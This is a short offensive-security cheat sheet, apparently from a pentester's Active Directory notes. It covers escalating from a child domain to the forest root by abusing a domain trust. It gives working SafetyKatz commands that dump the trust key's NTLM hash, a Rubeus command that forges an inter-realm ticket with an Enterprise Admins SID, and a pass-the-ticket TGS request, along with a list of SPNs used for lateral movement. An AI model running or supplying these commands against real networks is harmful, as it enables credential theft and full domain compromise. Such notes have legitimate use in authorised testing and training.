# Methodology
>1. Dump the trust key of the child domain (Credentials -> Hash NTLM).
>2. Forge an inter-forest ticket.
>3. Inject the ticket.

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz
**Get the trust key:**
```cmd
SafetyKatz.exe '"lsadump::trust /patch"'
SafetyKatz.exe '"lsadump::dcsync /user:contoso\techcorp$"'
SafetyKatz.exe '"lsadump::lsa /patch"'
```

## Rubeus
**Forge a interrealm TGT:**
```cmd
Rubeus.exe silver /user:Administrator /ldap /service:krbtgt/TECHCORP.LOCAL /rc4:a6215eeb238da9262d014a529fe03adb /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /nowrap
```

where:
- `silver` - Creates a forged Silver Ticket (TGS) for service authentication.  
- `/user` - Specifies the username to impersonate (e.g., `Administrator`).  
- `/ldap` - Targets the LDAP service on Domain Controllers.  
- `/service` - Specifies the service principal name (format: `krbtgt/DOMAIN.LOCAL`).
- `/rc4` - Provides the NTLM hash of the trust key account for ticket signing . 
- `/sids` - Adds Enterprise Admins SIDs to the ticket (e.g., Enterprise Admins `S-1-5-21-...-519`) .

**Request a TGS:**
```cmd
Rubeus.exe asktgs /service:CIFS/techcorpdc.TECHCORP.LOCAL /dc:techcorp-dc.TECHCORP.LOCAL /ptt /ticket:
```

>**ℹ️ Info:**
> Different SPN and what they're used for:
>- CIFS for directory browsing, copying files.
>- HTTP for WinRS.
>- HOST and CIFS for psexec.
>- HOST and RPCSS for WMI.
>- HOST and HTTP for PowerShell Remoting/WINRM.
>- LDAP for dcsync